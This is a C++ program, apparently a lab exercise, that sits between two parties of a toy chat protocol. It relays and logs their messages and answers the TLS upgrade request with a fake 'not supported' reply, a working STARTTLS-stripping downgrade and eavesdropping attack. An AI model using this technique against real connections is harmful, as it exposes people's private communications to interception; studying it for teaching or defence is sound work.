#include <iostream>
#include <cstring>

#include "server_tls.h"
#include "client_tls.h"

int main(int argc, char **argv)
{
	if (argc < 4 || (argc >= 2 && strcmp(argv[1], "-d") != 0))
	{
		std::cerr << "Usage: " << argv[0] << " -d <clienthostname> <serverhostname>" << std::endl;
		return 1;
	}
	std::cout << "Starting the Interceptor between " << argv[2] << " and " << argv[3] << std::endl;

	Server fake_bob;			// Acts as a server for Alice (argv[2]). Blocks any requests for upgrading to TLS
	Client fake_alice(argv[3]); // Acts as a client for Bob. Echos other messages to Bob

	fake_bob.accept_connection();
	fake_alice.connect_to_server();

	// Fork the process to have one process act as server and the other as a client
	int pid = fork();
	if (pid == 0)
	{
		while (true)
		{
			std::string alice_message = fake_bob.receive_message();
			std::cout << "Alice: " << alice_message << std::endl;
			if (alice_message == "chat_START_SSL")
			{
				fake_bob.send_message("chat_START_SSL_NOT_SUPPORTED"); // Blocks the TLS upgrade by replying to alice as fake bob.
			}
			else
			{
				fake_alice.send_message(alice_message); // Forwards the message to Bob
			}
		}
	}
	else
	{
		while (true)
		{
			std::string bob_message = fake_alice.receive_message();
			std::cout << "Bob: " << bob_message << std::endl;
			fake_bob.send_message(bob_message); // Forward Bob's message to Alice
		}
	}

	return 0;
}